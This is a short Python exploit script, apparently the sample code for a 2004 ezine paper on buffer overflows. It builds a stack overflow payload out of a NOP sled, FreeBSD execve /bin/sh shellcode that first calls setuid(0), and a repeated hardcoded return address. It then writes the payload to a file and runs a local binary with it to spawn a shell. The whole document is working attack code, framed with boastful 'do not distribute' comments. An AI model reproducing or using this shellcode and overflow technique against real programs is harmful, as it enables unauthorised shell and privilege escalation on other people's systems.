#!/usr/bin/env python
##
#  sample exploit for
#    defaced5 ezine
# python overflowz paper
#   
##
#      02/01/2004
# 
#       PR1VAT3!! 
# UNPUBL1SH3D SH1T!! L0L
#
#  D0 N0T D1STR1BUT3 
#       U FUCKR
#
##  

import os,struct

size = 528  # buf size
ret_addr = 0xbfbff9bf

""" freebsd execve shellcode by defaced staff. 
    published in defaced3 """

sh=""
sh+="\x31\xc0\x50\x6a\x17\x50\xcd\x80\x31\xc0\x50\x68\x6e"
sh+="\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x50\x53"
sh+="\x6a\x3b\x50\xcd\x80\x31\xc0\x50\x6a\x01\x50\xcd\x80"

buf=""
i=0
while i<453:
 buf+= "\x90"
 i+=1

buf+=sh

i=0
while i<18:
 buf+= struct.pack("<l",ret_addr)
 i+=1

buf+="\x0a"

l = open("killah","w")
l.write(buf)
l.close()

os.system('./a.out "`cat killah`" ')

# oooooooooo00000000000000W!!
